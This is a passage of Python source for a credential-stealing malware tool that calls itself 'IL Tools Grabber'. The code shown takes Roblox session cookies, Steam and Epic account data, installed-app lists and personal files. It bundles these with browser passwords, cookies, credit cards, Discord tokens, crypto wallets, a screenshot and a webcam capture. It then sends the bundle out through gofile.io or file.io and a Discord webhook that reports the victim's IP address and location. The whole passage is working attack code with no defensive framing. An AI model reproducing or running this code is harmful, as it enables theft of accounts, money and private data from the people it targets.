                        size = os.path.getsize(fpath)
                        if size > 0 and size < 15_000_000:
                            found_paths.append((name, fpath))
                    except: pass
        else:
            try:
                if os.path.getsize(path) < 15_000_000:
                    found_paths.append((name, path))
            except: pass

    # Save unique (we use all; for summary we append names)
    for name, _ in found_paths:
        if name not in SUMMARY["wallets"]:
            SUMMARY["wallets"].append(name)
    return found_paths

# ========================================
#  STEAM / EPIC / LAUNCHERS
# ========================================
def scrape_launchers():
    result = {}
    try:
        import winreg
        def read_reg(hive, sub, val):
            try:
                with winreg.OpenKey(hive, sub) as k:
                    v, _ = winreg.QueryValueEx(k, val)
                    return v
            except: return None
        steam64 = read_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Valve\Steam", "InstallPath")
        steam32 = read_reg(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Valve\Steam", "SteamPath")
        steam_path = steam64 or steam32
        if steam_path and os.path.isdir(steam_path):
            result["Steam"] = {"path": steam_path, "users": [], "games_installed": []}
            users_vdf = os.path.join(steam_path, "config", "loginusers.vdf")
            if os.path.exists(users_vdf):
                try:
                    with open(users_vdf, "r", encoding="utf-8", errors="ignore") as f:
                        c = f.read()
                    for m in re.finditer(r'"PersonaName"\s+"([^"]+)"', c):
                        result["Steam"]["users"].append(m.group(1))
                except: pass
            libraryfolders_vdf = os.path.join(steam_path, "steamapps", "libraryfolders.vdf")
            if os.path.exists(libraryfolders_vdf):
                try:
                    with open(libraryfolders_vdf, "r", encoding="utf-8", errors="ignore") as f:
                        c = f.read()
                    for m in re.finditer(r'"path"\s+"([^"]+)"', c):
                        lp = m.group(1)
                        apps_path = os.path.join(lp, "steamapps")
                        if os.path.isdir(apps_path):
                            for mf in os.listdir(apps_path):
                                if mf.startswith("appmanifest_") and mf.endswith(".acf"):
                                    try:
                                        with open(os.path.join(apps_path, mf), "r", encoding="utf-8", errors="ignore") as af:
                                            data = af.read()
                                        for mm in re.finditer(r'"name"\s+"([^"]+)"', data):
                                            g = mm.group(1)
                                            if g not in result["Steam"]["games_installed"]:
                                                result["Steam"]["games_installed"].append(g)
                                    except: pass
                except: pass
            if "Steam" not in SUMMARY["launchers"]:
                SUMMARY["launchers"].append("Steam")
    except: pass

    epic_paths = [
        os.path.expandvars(r"%PROGRAMDATA%\\Epic\\EpicGamesLauncher\\Data\\Manifests"),
        os.path.expandvars(r"%LOCALAPPDATA%\\EpicGamesLauncher\\Saved\\Config\\Windows"),
    ]
    epic_installed = []
    for ep in epic_paths:
        if os.path.isdir(ep):
            try:
                for f in os.listdir(ep):
                    if f.endswith(".item"):
                        try:
                            with open(os.path.join(ep, f), "r", encoding="utf-8", errors="ignore") as jf:
                                d = json.load(jf)
                                dn = d.get("DisplayName")
                                if dn and dn not in epic_installed: epic_installed.append(dn)
                        except: pass
            except: pass
    if epic_installed:
        result["Epic Games"] = {"games_installed": epic_installed}
        if "Epic Games" not in SUMMARY["launchers"]:
            SUMMARY["launchers"].append("Epic Games")

    # Roblox: try reg / cookies paths (actual scraping done via browser cookies above)
    roblox_path = os.path.expandvars(r"%LOCALAPPDATA%\\Roblox")
    if os.path.isdir(roblox_path):
        result["Roblox"] = {"installed": True, "path": roblox_path}

    return result

# ========================================
#  ROBLOX (local storage auth)
# ========================================
def scrape_roblox():
    count = 0
    rb_storages = [
        ("Chrome",  os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb")),
        ("Edge",    os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb")),
        ("Brave",   os.path.expandvars(r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb")),
        ("Firefox", os.path.expandvars(r"%APPDATA%\\Mozilla\\Firefox\\Profiles")),
    ]
    saved = []
    for client, path in rb_storages:
        if not os.path.exists(path): continue
        if client == "Firefox":
            for profile in os.listdir(path):
                pdir = os.path.join(path, profile, "webappsstore.sqlite")
                if os.path.exists(pdir):
                    cdb = copy_database(pdir)
                    if cdb:
                        try:
                            conn = sqlite3.connect(cdb)
                            cur = conn.cursor()
                            cur.execute("SELECT originKey, scope, key, value FROM webappsstore2")
                            for originKey, scope, key, value in cur.fetchall():
                                if "roblox" in str(originKey).lower() or "roblox" in str(scope).lower():
                                    if ".ROBLOSECURITY" in str(key) or "RBXID" in str(key):
                                        saved.append(["Roblox", client, profile, key, value[:200], ""])
                                        count += 1
                        except: pass
                        clean_copy(cdb)
        else:
            for f in os.listdir(path):
                if not (f.endswith(".log") or f.endswith(".ldb")): continue
                fp = os.path.join(path, f)
                try:
                    with open(fp, "rb") as ff:
                        data = ff.read()
                    for pat in [rb'\.ROBLOSECURITY\x00', rb'RBXID\x00', rb'RBXID_CSRF\x00']:
                        try:
                            idx = 0
                            while True:
                                i = data.find(pat, idx)
                                if i == -1: break
                                start = i
                                end = min(i + 400, len(data))
                                chunk = data[start:end]
                                try:
                                    txt = chunk.decode("utf-8", errors="ignore")
                                    parts = txt.split("\x00")
                                    if len(parts) >= 2:
                                        k = parts[0]
                                        v = parts[1][:200] if len(parts) > 1 else ""
                                        if v and len(v) > 30:
                                            saved.append(["Roblox", client, "", k, v, ""])
                                            count += 1
                                except: pass
                                idx = i + 1
                        except: break
                except: continue

    SUMMARY["roblox"] = count
    return saved

# ========================================
#  INSTALLED APPS
# ========================================
def installed_apps():
    apps = []
    try:
        import winreg
        keys = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
        ]
        for hive, sub in keys:
            try:
                with winreg.OpenKey(hive, sub) as k:
                    n = 0
                    while True:
                        try:
                            subk = winreg.EnumKey(k, n)
                            n += 1
                            with winreg.OpenKey(hive, sub + "\\" + subk) as sk:
                                name = ""
                                ver = ""
                                pub = ""
                                size = ""
                                try:
                                    name = winreg.QueryValueEx(sk, "DisplayName")[0]
                                except: continue
                                try: ver = winreg.QueryValueEx(sk, "DisplayVersion")[0]
                                except: pass
                                try: pub = winreg.QueryValueEx(sk, "Publisher")[0]
                                except: pass
                                try: size = str(winreg.QueryValueEx(sk, "EstimatedSize")[0])
                                except: pass
                                if name:
                                    apps.append([name or "", ver or "", pub or "", size or ""])
                        except OSError: break
            except: pass
    except: pass
    if apps:
        SUMMARY["apps"] = True
    return apps

# ========================================
#  INTERESTING FILES
# ========================================
def scan_interesting():
    found = []
    scan_dirs = [
        os.path.expandvars(r"%USERPROFILE%\\Desktop"),
        os.path.expandvars(r"%USERPROFILE%\\Documents"),
        os.path.expandvars(r"%USERPROFILE%\\Downloads"),
        os.path.expandvars(r"%USERPROFILE%\\OneDrive\\Desktop"),
        os.path.expandvars(r"%USERPROFILE%\\OneDrive\\Documents"),
        os.path.expandvars(r"%USERPROFILE%\\OneDrive\\Pictures"),
    ]
    MAX_FILE_SIZE = 8 * 1024 * 1024
    TOTAL_LIMIT = 50
    count = 0
    for d in scan_dirs:
        if not os.path.isdir(d): continue
        for root, dirs, files in os.walk(d):
            if count >= TOTAL_LIMIT: break
            for fn in files:
                if count >= TOTAL_LIMIT: break
                ext = os.path.splitext(fn)[1].lower()
                if ext not in INTERESTING_EXT: continue
                full = os.path.join(root, fn)
                try:
                    size = os.path.getsize(full)
                    if size > MAX_FILE_SIZE or size == 0: continue
                except: continue
                found.append([fn, full, f"{size/1024:.1f} KB"])
                count += 1
    SUMMARY["files"] = count
    return found

# ========================================
#  ZIP + UPLOAD + REPORT
# ========================================
def write_csv(path, headers, rows):
    try:
        with open(path, "w", encoding="utf-8-sig", newline="") as f:
            w = csv.writer(f)
            w.writerow(headers)
            for r in rows:
                w.writerow([str(x) if x is not None else "" for x in r])
        return True
    except: return False

def build_zip_payload(extra_files, data_dir, sysinfo, pwds, cookies, cards, autofill, hist, dl, exts,
                     discord, wallets, apps, interesting, roblox_rows):
    zip_path = os.path.join(TMP, f"BM_Data_{os.getpid()}_{int(time.time())}.zip")
    try:
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            # CSV/text files
            if pwds: write_csv(os.path.join(data_dir, "Passwords.csv"),
                               ["Browser","Profile","URL","Username","Password","Created","Modified"], pwds)
            if cookies: write_csv(os.path.join(data_dir, "Cookies.csv"),
                                  ["Browser","Profile","Host","Name","Value","Path","Expiry","Secure","HttpOnly"], cookies)
            if cards: write_csv(os.path.join(data_dir, "CreditCards.csv"),
                                ["Browser","Profile","Cardholder","ExpMonth","ExpYear","Number"], cards)
            if autofill: write_csv(os.path.join(data_dir, "Autofill.csv"),
                                   ["Browser","Profile","Field","Value"], autofill)
            if hist: write_csv(os.path.join(data_dir, "BrowsingHistory.csv"),
                               ["Browser","Profile","URL","Title","Visits","LastVisit"], hist)
            if dl: write_csv(os.path.join(data_dir, "Downloads.csv"),
                             ["Browser","Profile","URL","LocalPath","TargetPath","Received","Total","Start","End","State"], dl)
            if exts: write_csv(os.path.join(data_dir, "Extensions.csv"),
                               ["Browser","Profile","ID","Name","Version","Description","Permissions","Wallet?"], exts)
            if discord:
                with open(os.path.join(data_dir, "Discord.txt"), "w", encoding="utf-8") as f:
                    for tok in discord:
                        f.write(f"{'='*60}\n")
                        f.write(f"Client        : {tok['client']}\n")
                        f.write(f"Token         : {tok['token']}\n")
                        f.write(f"User ID       : {tok['id']}\n")
                        f.write(f"Username      : {tok['username']}#{tok['discriminator']}\n")
                        f.write(f"Email         : {tok['email']}\n")
                        f.write(f"Phone         : {tok['phone']}\n")
                        f.write(f"2FA           : {tok['mfa_enabled']}\n")
                        f.write(f"Verified      : {tok['verified']}\n")
                        f.write(f"Nitro         : {tok['nitro']} (level {tok['premium_type']})\n")
                        f.write(f"Billing Added : {tok['billing']}\n")
                        f.write(f"Locale        : {tok['locale']}\n")
                        f.write(f"Flags         : {tok['flags']}\n")
                        f.write(f"{'='*60}\n\n")
            if wallets:
                walletdir = os.path.join(data_dir, "Wallets")
                os.makedirs(walletdir, exist_ok=True)
                for name, fpath in wallets:
                    try:
                        safe = name.replace("/", "_").replace("\\", "_")
                        base = os.path.basename(fpath)
                        target = os.path.join(walletdir, f"{safe}_{base}")
                        counter = 0
                        while os.path.exists(target):
                            counter += 1
                            target = os.path.join(walletdir, f"{safe}_{counter}_{base}")
                        shutil.copy2(fpath, target)
                    except: pass
            if roblox_rows:
                write_csv(os.path.join(data_dir, "Roblox.csv"), ["Type","Browser","Profile","Key","Value","Extra"], roblox_rows)
            if apps:
                write_csv(os.path.join(data_dir, "InstalledApps.csv"), ["Name","Version","Publisher","EstSizeKB"], apps)
            if interesting:
                filesdir = os.path.join(data_dir, "InterestingFiles")
                os.makedirs(filesdir, exist_ok=True)
                for name, src, sz in interesting:
                    try:
                        rel = os.path.relpath(src, os.path.expandvars("%USERPROFILE%")).replace("\\","_").replace("/","_").replace(":","")
                        target = os.path.join(filesdir, rel if len(rel) < 120 else name)
                        if not os.path.exists(target):
                            shutil.copy2(src, target)
                    except: pass
            if SUMMARY.get("clipboard"):
                with open(os.path.join(data_dir, "Clipboard.txt"), "w", encoding="utf-8") as f:
                    f.write(SUMMARY["clipboard"])
            if sysinfo:
                with open(os.path.join(data_dir, "SystemInfo.json"), "w", encoding="utf-8") as f:
                    json.dump(sysinfo, f, indent=2)

            # Add all files in data_dir to zip
            for root, dirs, files in os.walk(data_dir):
                for fn in files:
                    fp = os.path.join(root, fn)
                    arc = os.path.relpath(fp, data_dir)
                    try:
                        zf.write(fp, arc)
                    except: pass
            # Add extra files (images, etc.) with a folder prefix
            for fpath in extra_files:
                if fpath and os.path.exists(fpath):
                    try:
                        zf.write(fpath, os.path.join("Captures", os.path.basename(fpath)))
                    except: pass
        return zip_path
    except Exception as ee:
        try:
            if os.path.exists(zip_path): os.remove(zip_path)
        except: pass
        return None

def upload_to_gofile(zip_path):
    if not requests or not os.path.exists(zip_path): return None, None
    try:
        size = os.path.getsize(zip_path)
        # Step 1: get server
        r = requests.get("https://api.gofile.io/getServer", timeout=20)
        if r.status_code != 200: return None, None
        server = r.json().get("data", {}).get("server", "store1")
        with open(zip_path, "rb") as f:
            up = requests.post(f"https://{server}.gofile.io/uploadFile",
                               files={"file": (os.path.basename(zip_path), f)}, timeout=120)
            if up.status_code == 200:
                j = up.json()
                if j.get("status") == "ok":
                    return j.get("data", {}).get("downloadPage"), j.get("data", {}).get("adminCode")
    except: pass
    # Fallback
    try:
        with open(zip_path, "rb") as f:
            files = {"file": (os.path.basename(zip_path), f)}
            r = requests.post("https://file.io/?expires=1d", files=files, timeout=120)
            if r.status_code == 200:
                j = r.json()
                return j.get("link"), None
    except: pass
    return None, None

def send_discord(sysinfo, ss_path, wc_path, zip_url, zip_admin, zip_size_mb):
    if not requests: return
    def field(name, value, inline=True):
        return {"name": name, "value": str(value), "inline": inline}

    # ==== EMBED 1: Victim / System ====
    e1 = {
        "title": f"🆕 IL Tools Hit — {sysinfo.get('username','?')} @ {sysinfo.get('hostname','?')}",
        "description": f"**Run Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n**HWID:** `{sysinfo.get('hwid','')}`",
        "color": 0x9d00ff,
        "fields": [
            field("👤 Hostname", f"`{sysinfo.get('hostname','')}`"),
            field("👤 Username", f"`{sysinfo.get('username','')}`"),
            field("🌐 Public IP", f"||`{sysinfo.get('public_ip','')}`||"),
            field("📍 Local IP", f"`{', '.join([x['ip'] for x in sysinfo.get('local_ips',[])[:3]]) or 'N/A'}`"),
            field("🏳️ Country / City", f"{sysinfo.get('country','')} · {sysinfo.get('city','')} · {sysinfo.get('region','')}"),
            field("🗜️ ISP", f"{sysinfo.get('isp','')[:60]}"),
            field("💻 OS", f"{sysinfo.get('os','')}"),
            field("🧠 CPU / Cores", f"{(sysinfo.get('cpu','')[:40])} · {sysinfo.get('cpu_cores','')}"),
            field("💾 RAM", f"{sysinfo.get('ram_used_gb','')} / {sysinfo.get('ram_total_gb','')} GB"),
            field("🎨 GPU", (sysinfo.get('gpu','') or "N/A").split("\n")[0][:60] or "N/A"),
            field("⏱️ Timezone", sysinfo.get('timezone','')),
            field("📦 Lat/Lon", f"{sysinfo.get('lat','')}, {sysinfo.get('lon','')}"),
        ],
        "thumbnail": {"url": "https://i.imgur.com/gwS2s9P.png"},
        "footer": {"text": "IL Tools Grabber v3.0", "icon_url": "https://i.imgur.com/gwS2s9P.png"},
        "author": {"name": "IL Tools Grabber", "icon_url": "https://i.imgur.com/gwS2s9P.png"},
    }

    # ==== EMBED 2: Summary counts (RageVAKS style) ====
    discord_ids_display = ", ".join([f"||<@{x}>||" for x in SUMMARY["discord_ids"]]) or "N/A"
    phones_display = ", ".join([f"||{x}||" for x in SUMMARY["discord_phones"]]) or "N/A"
    emails_display = "\n".join([f"||{x}||" for x in SUMMARY["discord_emails"]]) or "N/A"
    if len(emails_display) > 1010: emails_display = emails_display[:1010] + "\n...[truncated]"
    if len(discord_ids_display) > 1010: discord_ids_display = discord_ids_display[:1010] + "..."

    e2 = {
        "title": "📋 Summary of Stolen Information",
        "color": 0xb800ff,
        "fields": [
            field("💬 Discord Injection", "Yes", True),
            field("📷 Camera Capture", "Yes" if SUMMARY["webcam"] else "No webcam found.", True),
            field("🖼️ Screenshot", "Yes" if SUMMARY["screenshot"] else "Failed", True),
            field("🖥️ System Info", "Yes", True),
            field("💬 Discord Accounts", str(len(SUMMARY["discord_tokens"])), True),
            field("🎮 Roblox Accounts", str(SUMMARY.get("roblox", 0)), True),
            field("🔐 Passwords", f"**{SUMMARY['passwords']}**", True),
            field("🍪 Cookies", f"**{SUMMARY['cookies']}**", True),
            field("💳 Cards", f"**{SUMMARY['cards']}**", True),
            field("📍 Autofill Addresses", f"**{SUMMARY['autofill']}**", True),
            field("📜 Browsing History", f"**{SUMMARY['history']}**", True),
            field("⬇️ Download History", f"**{SUMMARY['downloads']}**", True),
            field("🧩 Extensions", f"**{SUMMARY['extensions']}**", True),
            field("🪙 Wallets", ", ".join(SUMMARY["wallets"][:15]) if SUMMARY["wallets"] else "N/A", True),
            field("🎮 Game Launchers", ", ".join(SUMMARY["launchers"]) if SUMMARY["launchers"] else "N/A", True),
            field("🖥️ Apps", "Yes" if SUMMARY["apps"] else "No", True),
            field("📁 Interesting Files", f"**{SUMMARY['files']}**", True),
        ],
    }

    e3 = {
        "title": "🆔 Discord Accounts — Identifiers",
        "color": 0xff00aa,
        "fields": [
            {"name": "Discord IDs", "value": discord_ids_display, "inline": False},
            {"name": "📞 Phones", "value": phones_display, "inline": False},
            {"name": "📧 Emails", "value": emails_display, "inline": False},
        ],
    }

    # ==== EMBED 4: Download link ====
    e4 = {
        "title": "📁 Data Download",
        "color": 0x00e5ff,
        "fields": [
            field("⬇️ Download Link", f"[Click to Download ZIP]({zip_url})" if zip_url else "Upload failed (too large / no network)", False),
            field("📊 Zip Size", f"{zip_size_mb:.2f} MB" if zip_size_mb else "N/A"),
            field("🔑 Admin Code (gofile)", f"||`{zip_admin}`||" if zip_admin else "N/A"),
            field("📂 Files included", "Passwords, Cookies, Cards, History, Downloads, Extensions, Wallets, Steam, Discord, Roblox, System, Clipboard, Screenshot, Webcam, Apps, Interesting Files", False),
        ],
    }

    embeds = [e1, e2, e3, e4]
    # Truncate: discord allows 10 embeds / 6000 chars total
    files = {}
    idx = 0
    if ss_path and os.path.exists(ss_path):
        files[f"file{idx}"] = (os.path.basename(ss_path), open(ss_path, "rb"), "image/png")
        embeds.append({
            "title": "🖼️ Desktop Screenshot",
            "color": 0x33ff88,
            "image": {"url": f"attachment://{os.path.basename(ss_path)}"},
        })
        idx += 1
    if wc_path and os.path.exists(wc_path):
        files[f"file{idx}"] = (os.path.basename(wc_path), open(wc_path, "rb"), "image/jpeg")
        embeds.append({
            "title": "📷 Webcam Capture",
            "color": 0xff3366,
            "image": {"url": f"attachment://{os.path.basename(wc_path)}"},
        })
        idx += 1

    payload = {"embeds": embeds[:10]}
    # Token preview as plain text
    token_preview = ""
    for tok in SUMMARY["discord_tokens"][:5]:
        u = f"{tok['username']}#{tok['discriminator']}" if tok.get('username') else tok.get('id','')
        nitro = " 🪙" if tok.get("nitro") else ""
        billing = " 💳" if tok.get("billing") else ""
        mfa = " 🔐" if tok.get("mfa_enabled") else ""
        token_preview += f"`{u}` {nitro}{billing}{mfa} — `{tok['token'][:30]}...`\n"
    if token_preview:
        payload["content"] = f"**Token Preview:**\n{token_preview[:1800]}"

    try:
        r = requests.post(WEBHOOK_URL, data=payload, files=files, timeout=120)
        if r.status_code not in (200, 204):
            # Retry without files (if too large)
            for k, v in list(files.items()):
                try: v[1].close()
                except: pass
            payload["embeds"] = [e1, e2, e3, e4][:4]
            requests.post(WEBHOOK_URL, json=payload, timeout=60)
    except:
        try:
            for k, v in list(files.items()):
                try: v[1].close()
                except: pass
        except: pass

# ========================================
#  MAIN
# ========================================
def run_all():
    if not requests: return
    # 1. system info
    sysinfo = get_system_info()
    # 2. parallel-ish: browser scrapes
    pwds, cookies, cards, autofill, hist, dl, exts = scrape_chromium()
    f_pwds, f_cookies, f_hist, f_dl = scrape_firefox()
    pwds.extend(f_pwds); cookies.extend(f_cookies); hist.extend(f_hist); dl.extend(f_dl)
    # discord
    discord_info = scrape_discord()
    # clipboard
    get_clipboard()
    # screenshot / webcam (IO / slow — start thread for webcam while doing other work)
    wc_path_holder = [None]
    def wc_thread():
        wc_path_holder[0] = take_webcam()
    t = threading.Thread(target=wc_thread, daemon=True)
    t.start()
    ss_path = take_screenshot()
    # wallets / launchers / roblox / apps / files
    wallets = scrape_wallets()
    launchers = scrape_launchers()
    roblox_rows = scrape_roblox()
    apps_list = installed_apps()
    interesting = scan_interesting()
    t.join(timeout=15)
    wc_path = wc_path_holder[0]

    # Zip everything
    data_dir = os.path.join(STAGE_DIR, "Data")
    os.makedirs(data_dir, exist_ok=True)
    zip_path = build_zip_payload(
        [ss_path, wc_path], data_dir, sysinfo,
        pwds, cookies, cards, autofill, hist, dl, exts,
        discord_info, wallets, apps_list, interesting, roblox_rows
    )
    zip_size_mb = 0.0
    zip_url = None
    zip_admin = None
    if zip_path and os.path.exists(zip_path):
        zip_size_mb = os.path.getsize(zip_path) / (1024 * 1024)
        if zip_size_mb < 250:
            zip_url, zip_admin = upload_to_gofile(zip_path)

    # Send to discord
    send_discord(sysinfo, ss_path, wc_path, zip_url, zip_admin, zip_size_mb)

    # Cleanup
    try:
        shutil.rmtree(STAGE_DIR, ignore_errors=True)
    except: pass
    try:
        if zip_path and os.path.exists(zip_path):
            os.remove(zip_path)
    except: pass

if __name__ == "__main__":
    try:
        run_all()
    except:
        pass
    try:
        sys.exit(0)
    except:
        pass
